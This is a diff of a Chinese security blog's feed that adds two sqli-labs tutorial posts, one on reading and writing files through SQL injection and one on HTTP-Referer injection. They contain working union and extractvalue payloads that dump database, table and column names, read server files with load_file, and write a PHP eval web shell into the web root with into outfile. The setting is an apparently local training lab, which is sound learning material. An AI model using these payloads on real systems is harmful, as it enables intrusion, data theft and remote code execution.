@@ -3,12 +3,66 @@
     <id>https://kiyomijin.github.io</id>
     <title>My Violet Eva Garden • Posts by &#34;sql注入探究&#34; category</title>
     <link href="https://kiyomijin.github.io" />
-    <updated>2022-10-01T15:10:40.000Z</updated>
-    <category term="SQL注入探究" />
+    <updated>2022-10-01T16:29:51.000Z</updated>
     <category term="原创" />
+    <category term="SQL注入探究" />
     <category term="数据库安全" />
     <category term="CTF小训" />
     <category term="Misc" />
+    <entry>
+        <id>https://kiyomijin.github.io/2022/10/02/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/SQL%E6%B3%A8%E5%85%A5%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6/</id>
+        <title>SQL注入读写文件</title>
+        <link rel="alternate" href="https://kiyomijin.github.io/2022/10/02/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/SQL%E6%B3%A8%E5%85%A5%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6/"/>
+        <content type="html">&lt;h1 id=&#34;sql注入之sql注入读写文件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sql注入之sql注入读写文件&#34;&gt;#&lt;/a&gt; SQL 注入之 SQL 注入读写文件&lt;/h1&gt;
+&lt;p&gt;本篇讲解 SQL 注入读写文件&lt;/p&gt;
+&lt;p&gt;使用到的函数如下：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Load_file(file_name):读取文件并返回该文件的内容作为一个字符串。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;使用条件：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;A、必须有权限读取并且文件必须完全可读&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;B、欲读取文件必须在服务器上&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;C、必须指定文件完整的路径&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;D、欲读取文件必须小于 max_allowed_packet&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;Less-1 为例&lt;/p&gt;
+&lt;h2 id=&#34;尝试报错&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#尝试报错&#34;&gt;#&lt;/a&gt; 尝试报错&lt;/h2&gt;
+&lt;p&gt;添加一个单引号：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-1/?id=1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221002005100344.png&#34; alt=&#34;image-20221002005100344&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;尝试不报错&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#尝试不报错&#34;&gt;#&lt;/a&gt; 尝试不报错&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-1/?id=1&amp;#x27; %23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221002005148813.png&#34; alt=&#34;image-20221002005148813&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;尝试order-by注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#尝试order-by注入&#34;&gt;#&lt;/a&gt; 尝试 order by 注入&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-1/?id=1&amp;#x27; order by 3 %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;不报错&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-1/?id=1&amp;#x27; order by 4 %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Unknown column &amp;#x27;4&amp;#x27; in &amp;#x27;order clause&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;读取文件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#读取文件&#34;&gt;#&lt;/a&gt; 读取文件&lt;/h2&gt;
+&lt;p&gt;一般获取服务器的绝对路径有两种方法：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;通过经验猜测和自己搭建的服务器同样的路径&lt;/li&gt;
+&lt;li&gt;通过爆破手段得到&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;这里就演示一下本地服务器绝对路径&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-1/?id=-11&amp;#x27; union select 1, 2, load_file(&amp;quot;C:\\phpStudyB\\WWW\\sqli\\Less-1\\index.php&amp;quot;) %23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221002005701120.png&#34; alt=&#34;image-20221002005701120&#34;&gt;&lt;/p&gt;
+&lt;p&gt;显示比较混乱，原因是当读取到 index.php 之后返回给页面的是 php 语句，所以在页面显示的时候被 php 重复解析。&lt;/p&gt;
+&lt;p&gt;我们转换 Hex 存储&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-1/?id=-11&amp;#x27; union select 1, 2, Hex(load_file(&amp;quot;C:\\phpStudyB\\WWW\\sqli\\Less-1\\index.php&amp;quot;)) %23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221002005946274.png&#34; alt=&#34;image-20221002005946274&#34;&gt;&lt;/p&gt;
+&lt;p&gt;接下来去 BurpSuit，或者在线网站转码。这里选择&lt;strong&gt; BurpSuit&lt;/strong&gt;，选择 &lt;code&gt;Decoder-Decode as.....-Ascii hex&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221002010101190.png&#34; alt=&#34;image-20221002010101190&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;写入文件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#写入文件&#34;&gt;#&lt;/a&gt; 写入文件&lt;/h2&gt;
+&lt;p&gt;写入文件使用函数为：into outfile&lt;/p&gt;
+&lt;p&gt;例子为 Less-7&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-7/?id=1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221002010552632.png&#34; alt=&#34;image-20221002010552632&#34;&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-7/?id=1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;报错&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-7/?id=1&amp;#x27; %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;报错，如果仅是单引号注入则这里不应该报错。所以根据经验尝试加个括号&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-7/?id=1&amp;#x27;) %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;报错，一个小括号不够？那就再加一个&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-7/?id=1&amp;#x27;)) %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;成功不报错&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;那么，使用 order by 确定列数&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-7/?id=1&amp;#x27;)) order by 3 %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;不报错&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-7/?id=1&amp;#x27;)) order by 4 %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;You have an error in your SQL syntax，报错，所以只有三列&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;使用 &lt;code&gt;into outflie&lt;/code&gt;  语句&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-7/?id=1&amp;#x27;)) union select 1,2,3 into outfile &amp;quot;C:\\phpStudyB\\WWW\\sqli\\Less-7\\aaa.txt&amp;quot; %23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221002011103261.png&#34; alt=&#34;image-20221002011103261&#34;&gt;&lt;/p&gt;
+&lt;p&gt;虽然报错，但是我们尝试去看一下 &lt;code&gt;Less-7/aaa.txt&lt;/code&gt;  有没有生成&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221002011152149.png&#34; alt=&#34;image-20221002011152149&#34;&gt;&lt;/p&gt;
+&lt;p&gt;写入成功。那么，既然可以写入文件，那就可以写入一句话木马。&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-7/?id=1&amp;#x27;)) union select 1,2,&amp;quot;&amp;lt;?php @eval ($_POST[value]);?&amp;gt;&amp;quot; into outfile &amp;quot;C:\\phpStudyB\\WWW\\sqli\\Less-7\\aaa.php&amp;quot; %23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;并成功解析成 php 执行。&lt;/p&gt;
+&lt;p&gt;至此，SQL 注入文件读写演示完毕。&lt;/p&gt;
+</content>
+        <category term="SQL注入探究" />
+        <updated>2022-10-01T16:29:51.000Z</updated>
+    </entry>
     <entry>
         <id>https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/HTTP-Referer%E6%B3%A8%E5%85%A5/</id>
         <title>HTTP-Referer注入</title>
@@ -18,7 +72,48 @@
 &lt;div class=&#34;note info&#34;&gt;
 &lt;p&gt;HTTP-Referer 注入&lt;/p&gt;
 &lt;/div&gt;
-&lt;p&gt;在前几章的博客中，满篇都是对于&lt;/p&gt;
+&lt;p&gt;在前几章的博客中，满篇都是对于基于 select 的注入手段。&lt;/p&gt;
+&lt;p&gt;其实，对于数据库而言，像 update、insert 等命令都有可爆出数据库信息的点的。&lt;/p&gt;
+&lt;p&gt;OK，开始做 Less-19，送入&lt;strong&gt; Repeater&lt;/strong&gt;。&lt;/p&gt;
+&lt;h2 id=&#34;尝试报错&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#尝试报错&#34;&gt;#&lt;/a&gt; 尝试报错&lt;/h2&gt;
+&lt;p&gt;在 Referer 后添加一个单引号：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://127.0.0.1/sqli/Less-19/&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;结果报错&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221001235013114.png&#34; alt=&#34;image-20221001235013114&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;尝试不报错&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#尝试不报错&#34;&gt;#&lt;/a&gt; 尝试不报错&lt;/h2&gt;
+&lt;p&gt;我们尝试通过加 双引号 &amp;quot;、 #号及其变形（#、%23、–+）来看看能否不报错&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://127.0.0.1/sqli/Less-19/&amp;#x27;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#x27;&amp;quot;&amp;#x27;, &amp;#x27;127.0.0.1&amp;#x27;)&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://127.0.0.1/sqli/Less-19/&amp;#x27; #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#x27;&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://127.0.0.1/sqli/Less-19/&amp;#x27;&amp;quot; %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#x27;&amp;quot; %23&amp;#x27;, &amp;#x27;127.0.0.1&amp;#x27;)&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://127.0.0.1/sqli/Less-19/&amp;#x27; --+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#x27;&amp;quot; --+&amp;#x27;, &amp;#x27;127.0.0.1&amp;#x27;)&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;后面还有个小括号，试试看是否需要闭合&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://127.0.0.1/sqli/Less-19/&amp;#x27;&amp;quot;) --+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#x27;&amp;quot;) --+&amp;#x27;, &amp;#x27;127.0.0.1&amp;#x27;)&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://127.0.0.1/sqli/Less-19/&amp;#x27;)&amp;quot; --+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#x27;&amp;quot; --+&amp;#x27;, &amp;#x27;127.0.0.1&amp;#x27;)&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;strong&gt;依旧不行，我们回过头来看看第一个报错&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;near &#39;&amp;quot;&#39;, &#39;127.0.0.1&#39;)&#39; at line 1&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;去掉最外层的两个单引号：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;&amp;quot;&#39;, &#39;127.0.0.1&#39;)&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;一个数据库语句出现了逗号，说明极有可能是 union 引导的 &lt;code&gt;select 1,2 &lt;/code&gt; 这样的查询，或者是&lt;strong&gt; insert、update&lt;/strong&gt; 这样的语句：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;insert into 表名 values(a,b,c)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;例子：insert into student_info values(5,&amp;#x27;liutao&amp;#x27;,&amp;#x27;12&amp;#x27;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UPDATE student_info SET num=4,name=&amp;#x27;liutao&amp;#x27;,age=&amp;#x27;15&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;因为除了逗号之外还出现了括号，&lt;strong&gt;update 和 select 一般是没有括号的&lt;/strong&gt;，因此锁定在&lt;strong&gt; insert into&lt;/strong&gt; 上。&lt;/p&gt;
+&lt;p&gt;那么，我们目前注入的位置是很大概率在 &lt;code&gt;&#39;liutao&#39;, &#39;12&#39;&lt;/code&gt;  这个逗号所在位置附近。&lt;/p&gt;
+&lt;p&gt;因此，&lt;strong&gt;由于注入内容后面跟着一个单引号&lt;/strong&gt;，我们尝试 &lt;code&gt;and&lt;/code&gt;  结合 &lt;code&gt;单引号&lt;/code&gt; 注入：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;insert into student_info values(5,&amp;#x27;liutao&amp;#x27; and &amp;#x27;&amp;#x27;,&amp;#x27;12&amp;#x27;); &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;OK，替换成我们的语句就是：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://127.0.0.1/sqli/Less-19/&amp;#x27; and &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;成功不报错&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221002000657623.png&#34; alt=&#34;image-20221002000657623&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;优先尝试报错注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#优先尝试报错注入&#34;&gt;#&lt;/a&gt; 优先尝试报错注入&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;由于是使用 and + 单引号注入&lt;/strong&gt;，可插入非法查询语句的位置和平常不太一样，因此我们尝试再加入 &lt;code&gt;一个and来构造一个报错条件&lt;/code&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://127.0.0.1/sqli/Less-19/&amp;#x27; and extractvalue(1,concat(0x7e,version(),0x7e)) and &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221002001021204.png&#34; alt=&#34;image-20221002001021204&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;爆数据库名&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#爆数据库名&#34;&gt;#&lt;/a&gt; 爆数据库名&lt;/h2&gt;
+&lt;p&gt;接下来就是替换 version () 了。&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://127.0.0.1/sqli/Less-19/&amp;#x27; and extractvalue(1,concat(0x7e,database(),0x7e)) and &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221002001434314.png&#34; alt=&#34;image-20221002001434314&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;爆表名&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#爆表名&#34;&gt;#&lt;/a&gt; 爆表名&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://127.0.0.1/sqli/Less-19/&amp;#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) and &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221002001605648.png&#34; alt=&#34;image-20221002001605648&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;爆列名&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#爆列名&#34;&gt;#&lt;/a&gt; 爆列名&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://127.0.0.1/sqli/Less-19/&amp;#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&amp;#x27;users&amp;#x27;),0x7e)) and &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221002001714543.png&#34; alt=&#34;image-20221002001714543&#34;&gt;&lt;/p&gt;
+&lt;p&gt;至此，HTTP-Referer 注入演示完毕。&lt;/p&gt;
 </content>
         <category term="SQL注入探究" />
         <updated>2022-10-01T15:10:40.000Z</updated>
